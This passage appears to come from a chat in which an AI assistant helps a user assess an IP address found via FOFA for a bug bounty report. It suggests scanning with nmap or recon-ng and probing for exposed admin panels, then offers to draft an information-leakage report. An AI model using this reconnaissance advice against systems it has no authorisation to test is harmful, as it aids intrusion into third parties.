Lack of Security Controls:

If this IP is exposed while it should be behind some form of internal networking or protected via a VPN, this could highlight gaps in the security measures of the organization.
Is It a Vulnerability?
Not directly, but the fact that this IP address was exposed in a public search (FOFA) may indicate a lack of proper access control or network segmentation.

It might be a security misconfiguration where a resource, which should be protected or private, is made public unintentionally.

Next Steps for You:
Check for Access to Services:

You can try to ping or scan the IP address to see if it’s actively hosting any services.
Tools like nmap or recon-ng can help you identify open ports and services running on the server.
Explore DNS and Web Resources:

Check whether this IP is associated with open ports (like HTTP/HTTPS) or internal applications that shouldn’t be publicly accessible.
Explore whether there are any unsecured APIs or admin panels exposed on this IP address.
Report as Information Leakage:

If this IP is indeed leaking internal resources, you can report it as an information leakage vulnerability.
Mention that this could lead to reconnaissance by attackers and potentially further attacks if not addressed.
Summary:
The IP address is not inherently a vulnerability but represents a potential security risk due to exposure.
It is important to verify if this IP was intended to be public. If it's not, this could be an internal resource leakage, and the organization should take action to mitigate it (e.g., network segmentation, access controls, and firewall configurations).
Would you like me to assist you further with how to investigate this IP or create a bug bounty report for this?

You said:
I got it, which points you noted like information/ip exposure
